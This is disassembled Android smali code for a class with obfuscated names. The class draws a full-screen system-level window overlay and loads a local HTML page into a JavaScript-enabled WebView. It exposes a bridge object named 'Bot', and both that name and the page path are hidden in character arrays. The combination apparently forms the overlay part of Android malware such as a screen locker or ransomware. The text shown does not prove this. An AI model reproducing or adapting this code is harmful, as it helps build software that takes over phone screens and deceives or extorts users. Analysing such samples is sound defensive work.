.class public Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;
.super Landroid/widget/RelativeLayout;
.source "Ytclvzmdi.java"


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "SetJavaScriptEnabled"
    }
.end annotation

.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi$Fbgeb;
    }
.end annotation


# instance fields
.field private height:I

.field protected layoutParams:Landroid/view/WindowManager$LayoutParams;

.field private layoutResId:I

.field private notificationId:I

.field private width:I


# direct methods
.method public constructor <init>(Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;)V
    .locals 2
    .param p1, "service"    # Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;

    .prologue
    const/4 v1, 0x1

    .line 69
    invoke-direct {p0, p1}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    .line 62
    const/4 v0, 0x0

    iput v0, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->notificationId:I

    .line 71
    const v0, 0x7f030001

    iput v0, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->layoutResId:I

    .line 72
    iput v1, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->notificationId:I

    .line 74
    invoke-virtual {p0, v1}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->setLongClickable(Z)V

    .line 77
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->load()V

    .line 78
    return-void
.end method

.method private inflateView()V
    .locals 6

    .prologue
    const/4 v5, 0x1

    const/4 v4, 0x0

    .line 110
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "layout_inflater"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    .line 112
    .local v0, "inflater":Landroid/view/LayoutInflater;
    iget v2, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->layoutResId:I

    invoke-virtual {v0, v2, p0}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    .line 114
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->onInflateView()V

    .line 115
    const v2, 0x7f070001

    invoke-virtual {p0, v2}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    .line 117
    .local v1, "myWebView":Landroid/webkit/WebView;
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 118
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, v4}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 119
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, v4}, Landroid/webkit/WebSettings;->setSaveFormData(Z)V

    .line 120
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, v4}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V

    .line 121
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, v4}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 122
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 135
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    sget-object v3, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    .line 136
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const/4 v3, 0x2

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 137
    new-instance v2, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi$Fbgeb;

    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, p0, v3}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi$Fbgeb;-><init>(Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;Landroid/content/Context;)V

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x3

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 138
    new-instance v2, Ljava/lang/String;

    const/16 v3, 0x20

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 140
    return-void

    .line 137
    nop

    :array_0
    .array-data 2
        0x42s
        0x6fs
        0x74s
    .end array-data

    .line 138
    nop

    :array_1
    .array-data 2
        0x66s
        0x69s
        0x6cs
        0x65s
        0x3as
        0x2fs
        0x2fs
        0x2fs
        0x61s
        0x6es
        0x64s
        0x72s
        0x6fs
        0x69s
        0x64s
        0x5fs
        0x61s
        0x73s
        0x73s
        0x65s
        0x74s
        0x2fs
        0x69s
        0x6es
        0x64s
        0x65s
        0x78s
        0x2es
        0x68s
        0x74s
        0x6ds
        0x6cs
    .end array-data
.end method

.method private setupLayoutParams()V
    .locals 6

    .prologue
    const/4 v1, -0x1

    .line 91
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7da

    const/16 v4, 0x100

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    iput-object v0, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    .line 93
    iget-object v0, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getLayoutGravity()I

    move-result v1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 95
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->onSetupLayoutParams()V

    .line 97
    return-void
.end method


# virtual methods
.method protected addView()V
    .locals 2

    .prologue
    .line 172
    invoke-direct {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->setupLayoutParams()V

    .line 174
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iget-object v1, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, p0, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 176
    const/16 v0, 0x8

    invoke-super {p0, v0}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    .line 177
    return-void
.end method

.method protected animationView()Landroid/view/View;
    .locals 0

    .prologue
    .line 231
    return-object p0
.end method

.method public destory()V
    .locals 2

    .prologue
    .line 198
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    invoke-interface {v0, p0}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 199
    return-void
.end method

.method public getLayoutGravity()I
    .locals 1

    .prologue
    .line 87
    const/16 v0, 0x11

    return v0
.end method

.method protected getLeftOnScreen()I
    .locals 2

    .prologue
    .line 261
    const/4 v1, 0x2

    new-array v0, v1, [I

    .line 263
    .local v0, "location":[I
    invoke-virtual {p0, v0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getLocationOnScreen([I)V

    .line 265
    const/4 v1, 0x0

    aget v1, v0, v1

    return v1
.end method

.method public getService()Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;
    .locals 1

    .prologue
    .line 81
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getContext()Landroid/content/Context;

    move-result-object v0

    check-cast v0, Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;

    return-object v0
.end method

.method protected getTopOnScreen()I
    .locals 2

    .prologue
    .line 269
    const/4 v1, 0x2

    new-array v0, v1, [I

    .line 271
    .local v0, "location":[I
    invoke-virtual {p0, v0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getLocationOnScreen([I)V

    .line 273
    const/4 v1, 0x1

    aget v1, v0, v1

    return v1
.end method

.method protected hide()V
    .locals 1

    .prologue
    .line 236
    const/16 v0, 0x8

    invoke-super {p0, v0}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    .line 237
    return-void
.end method

.method public isVisible()Z
    .locals 1

    .prologue
    .line 152
    const/4 v0, 0x1

    return v0
.end method

.method protected load()V
    .locals 0

    .prologue
    .line 180
    invoke-direct {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->inflateView()V

    .line 181
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->addView()V

    .line 182
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->refresh()V

    .line 183
    return-void
.end method

.method protected onInflateView()V
    .locals 0

    .prologue
    .line 147
    return-void
.end method

.method protected onSetupLayoutParams()V
    .locals 0

    .prologue
    .line 102
    return-void
.end method

.method protected onVisibilityToChange(I)Z
    .locals 1
    .param p1, "visibility"    # I

    .prologue
    .line 227
    const/4 v0, 0x1

    return v0
.end method

.method public refresh()V
    .locals 1

    .prologue
    .line 204
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->isVisible()Z

    move-result v0

    if-nez v0, :cond_0

    .line 205
    const/16 v0, 0x8

    invoke-virtual {p0, v0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->setVisibility(I)V

    .line 211
    :goto_0
    return-void

    .line 207
    :cond_0
    const/4 v0, 0x0

    invoke-virtual {p0, v0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->setVisibility(I)V

    .line 209
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->refreshViews()V

    goto :goto_0
.end method

.method public refreshLayout()V
    .locals 2

    .prologue
    .line 158
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->isVisible()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 159
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->removeAllViews()V

    .line 160
    invoke-direct {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->inflateView()V

    .line 162
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->onSetupLayoutParams()V

    .line 164
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iget-object v1, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, p0, v1}, Landroid/view/WindowManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 166
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->refresh()V

    .line 169
    :cond_0
    return-void
.end method

.method protected refreshViews()V
    .locals 0

    .prologue
    .line 216
    return-void
.end method

.method protected reload()V
    .locals 0

    .prologue
    .line 192
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->unload()V

    .line 194
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->load()V

    .line 195
    return-void
.end method

.method public setVisibility(I)V
    .locals 5
    .param p1, "visibility"    # I

    .prologue
    const/4 v1, 0x1

    const/4 v0, 0x0

    .line 247
    if-nez p1, :cond_2

    .line 248
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getService()Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;

    move-result-object v2

    iget v3, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->notificationId:I

    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->showNotificationHidden()Z

    move-result v4

    if-eqz v4, :cond_1

    :goto_0
    invoke-virtual {v2, v3, v0}, Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;->moveToForeground(IZ)V

    .line 253
    :goto_1
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getVisibility()I

    move-result v0

    if-eq v0, p1, :cond_0

    .line 254
    invoke-virtual {p0, p1}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->onVisibilityToChange(I)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 255
    invoke-super {p0, p1}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    .line 258
    :cond_0
    return-void

    :cond_1
    move v0, v1

    .line 248
    goto :goto_0

    .line 250
    :cond_2
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getService()Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;

    move-result-object v2

    iget v3, p0, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->notificationId:I

    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->showNotificationHidden()Z

    move-result v4

    if-eqz v4, :cond_3

    :goto_2
    invoke-virtual {v2, v3, v0}, Lnsuj/wbbgue/bmzbhnz/Sinngtcfu;->moveToBackground(IZ)V

    goto :goto_1

    :cond_3
    move v0, v1

    goto :goto_2
.end method

.method protected show()V
    .locals 1

    .prologue
    .line 242
    const/4 v0, 0x0

    invoke-super {p0, v0}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    .line 243
    return-void
.end method

.method protected showNotificationHidden()Z
    .locals 1

    .prologue
    .line 221
    const/4 v0, 0x1

    return v0
.end method

.method protected unload()V
    .locals 2

    .prologue
    .line 186
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    invoke-interface {v0, p0}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 188
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Ytclvzmdi;->removeAllViews()V

    .line 189
    return-void
.end method
